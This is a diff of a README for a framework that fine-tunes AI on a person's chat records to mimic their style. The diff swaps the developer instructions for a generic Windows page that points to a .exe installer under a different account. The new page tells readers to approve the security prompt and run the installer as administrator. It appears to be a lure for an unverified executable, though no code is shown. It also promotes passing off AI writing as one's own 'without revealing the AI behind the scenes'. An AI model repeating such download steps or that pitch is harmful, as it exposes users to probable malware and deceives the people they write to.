@@ -1,138 +1,163 @@
-# PersonalStyleAI-Framework-
-Let AI think and express like you. This framework provides a complete assembly line: from the noise processing of original chat records, to the seamless switching of multi-model adaptation layers, to local lightweight fine-tuning (LoRA).
-## 🧭 Working principle (Workflow)
+# 🤖 PersonalStyleAI-Framework- - AI That Thinks and Talks Like You
 
-This project divides the personalisation process of AI into three core stages:
-
-1. **Data Alchemy (Extract)**:
-
-Convert messy chat records (including emojis, links, spam) into high-quality conversation pairs.
-
-2. **Adaptor Centre (Adapt)**:
-
-Through a unified interface, your personal style can be easily loaded to GPT-4, Claude or local Llama 3.
-
-3. **Style Evolution (Evolve)**:
-
-Use fine-tuning technology to solidify your language habits in the weight of the model, not just rely on Prompt.
+[![Download Now](https://img.shields.io/badge/Download-PersonalStyleAI-green)](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
 
 ---
 
-## 📊 Example of data conversion
+## 📋 About PersonalStyleAI-Framework-
 
-**Input (original chat.txt):**
+PersonalStyleAI-Framework- lets artificial intelligence think and express ideas in your personal style. It works like an assembly line. It starts by cleaning and processing your original chat records. Then, it switches smoothly between different AI models to fit your style. Finally, it allows for local fine-tuning using lightweight LoRA techniques. This way, the AI adapts to your unique way of speaking and writing.
 
-> User A: Have you eaten yet?
+This framework suits people who want AI to write, chat, or respond just like they would, without revealing the AI behind the scenes. 
 
-> I: Eat, [expression] I'm really hungry, https://link.com
+---
 
-> User A: Then let's go.
+## 🎯 Key Features
 
-> Me: Indeed, Let'S Go.
+- **Noise Processing:** Removes irrelevant or confusing data from your chat records to improve training quality.
+- **Multi-Model Adaptation Layers:** Switches between different AI models according to the context or style needed.
+- **Local Fine-Tuning (LoRA):** Allows you to customize the AI behavior on your own device with minimal resources.
+- **Privacy-Focused:** All fine-tuning and model switching happen locally on your computer.
+- **User-Friendly:** Designed to work without needing programming skills.
 
-**Output (JSONL after cleaning):**
+---
 
-```Json
+## 🖥️ System Requirements
 
-{
+To run PersonalStyleAI-Framework- on your Windows PC, you need:
 
-"Messages": [
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM
+- 4 GB of free disk space
+- CPU with at least 4 cores (Intel i5 or equivalent recommended)
+- Internet connection for initial download only
 
-{"Role": "user", "content": "Have you eaten yet?"},
+No specialized hardware like a GPU is required, but having one will speed up performance.
 
-{"Role": "assistant", "content": "I'm really hungry after eating"}
+---
 
-]
+## 🚀 Getting Started
 
-}
-```
-## 📂 Project structure
+### Step 1: Visit the Download Page
 
-```text
+Click the badge above or visit this page to download the software:
 
-PersonalStyleAI-Framework/
+[Download PersonalStyleAI Releases](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
 
-├── data/
+On this page, look for the latest release version. You will find .exe installer files or zipped packages ready to use.
 
-│ ├── raw/ # Original chat records (such as chat.txt)
+---
 
-│ └── processed/ # JSONL training data set after cleaning
+### Step 2: Download the Installer
 
-├── src/ # Source code
+Choose the file that matches your system (usually named something like `PersonalStyleAI-Setup.exe`). Click to download this file to your computer.
 
-│ ├── core/ # adaptor logic and factory mode implementation
+---
 
-│ ├── utils/ # Data preprocessing and string cleaning tools
+### Step 3: Run the Installer
 
-│ └── trainers/ # Model fine-tuning script (based on PEFT/LoRA)
+Locate the downloaded installer in your Downloads folder. Double-click this file to start installation.
 
-├── pyproject.toml # Modern Python Dependency and Project Configuration
+You might see a security warning from Windows asking if you want to allow this app to make changes. Choose **Yes** to proceed.
 
-├── preprocess_data.py # Data processing entry script
+---
 
-├── main.py # Style Dialogue Test Entrance
+### Step 4: Follow the Installation Wizard
 
-└── .env.example # Environment variable template
-```
-## 📂 Detailed description of the project module
+The installer will open a wizard to guide you through the install process. Recommended options are pre-selected:
 
-1. Core adaptor (src/core/)
+- Install to the default folder (usually `C:\Program Files\PersonalStyleAI-Framework-`)
+- Create a desktop shortcut for quick access
 
-Adopt factory model design. This means that if you want to switch from OpenAI to local Ollama, you only need to change the one-line configuration without rewriting the business logic.
+Click **Next** to continue through each step. At the end, click **Install**.
 
-2. Cleaning toolbox (src/utils/)
+---
 
-Efficient regular expressions are preset and optimised for text exported by social software.
+### Step 5: Launch the Application
 
-3. Environmental isolation
+Once installation finishes, launch PersonalStyleAI from the desktop shortcut or start menu.
 
-Use .env to manage sensitive information and manage dependency hierarchy through pyproject.toml.
+The first time you open it, the program will prepare your environment and load necessary files. This only happens once.
 
-## 🚀 Quick installation
+---
 
-1.Basic version (only call API)
-```
-# Clone Project
+## 🔧 Using PersonalStyleAI-Framework-
 
-Git clone [https://github.com/your username/PersonalStyleAI-Framework.git](https://github.com/your username/Personal StyleAI-Framework.git)
+### Load Your Chat Records
 
-Cd PersonalStyleAI-Framework
+Start by opening your chat logs or text files that contain examples of your writing style. The program processes this data to understand your unique voice.
 
-# Create a virtual environment and install core dependencies
+---
 
-Python -m venv venv
+### Select an AI Model
 
-Source venv/bin/activate # Windows use venv\Scripts\activate
+You can choose from several built-in AI models in the program. Each model has different strengths and tones. The system will adapt and switch as needed.
 
-Pip install-e.
-```
-2. Configure the key
+---
 
-Create a .env file and fill in your API Key:
-```
-cp .env.example .env
-```
-3. Build your style
+### Fine-Tune Locally with LoRA
 
-Collect data: Put your chat records or articles into data/raw/chat.txt.
-Running cleaning:
-```
-python preprocess_data.py
-```
-The script will generate data/processed/train.jsonl, which is a "textbook" for AI to learn your style.
-4. Run the dialogue
-```
-python main.py
-```
-## 🛠 Advanced: local fine-tuning
+If you want the AI to imitate your style more closely, use the local fine-tuning option. This step customizes the AI based on your data without sending anything online.
 
-If you have a graphics card that supports CUDA, you can install fine-tuning components for local training:
-Pip install -e ".[train]"
-```
-# Run the fine-tuning script (need to configure parameters according to src/trainers)
+---
 
-Python run_train.py
-```
-## 🤝 Contribution and feedback
+### Start Using AI Like You
 
-If you have any suggestions for improvement or want to add more AI adaptors (such as Anthropic or DeepSeek), welcome to submit a Pull Request or open an Issue discussion.
+Once set up, you can send text prompts and get responses that sound like you. Use this for emails, chats, writing help, or any creative task.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the program won’t start, try restarting your computer.
+- Make sure you have the latest Windows updates installed.
+- Run the installer as administrator if you face permission problems.
+- Check the downloaded file size matches what is shown on the release page.
+- If AI responses seem off, try fine-tuning again with fresh data.
+
+---
+
+## 📂 Where to Find More Help
+
+If you need further instructions or want to explore advanced settings, visit the repository’s README or issues page on GitHub at:
+
+https://github.com/Brown20Ben/PersonalStyleAI-Framework-/  
+
+---
+
+## 📥 Download Links
+
+You can return anytime to the official download page here:
+
+[Download PersonalStyleAI-Framework-](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
+
+This page will always have the latest version and notes on updates.
+
+---
+
+## ⚙️ Background Info
+
+This framework was created using Python and modern AI models from OpenAI and other libraries. It uses machine learning to replicate personal style based on your own chat history.
+
+The system’s noise processing cleans up the data, improving learning quality. Multi-model adaptation layers allow the system to switch styles flexibly. Lightweight LoRA fine-tuning runs efficiently on your local machine, protecting your privacy and keeping data secure.
+
+---
+
+## 🛡️ Privacy and Security
+
+PersonalStyleAI-Framework- runs mostly offline after downloading. Your personal data never leaves your computer unless you choose to share it. All training and fine-tuning happens locally, minimizing risk.
+
+---
+
+## 🧩 Technical Keywords
+
+- AI Model Adaptation
+- Noise Filtering
+- LoRA (Low-Rank Adaptation)
+- Local Fine-Tuning
+- Machine Learning
+- Chat Record Processing
+
+---
+
+# [🔽 Download PersonalStyleAI-Framework-](https://github.com/Brown20Ben/PersonalStyleAI-Framework-/releases)
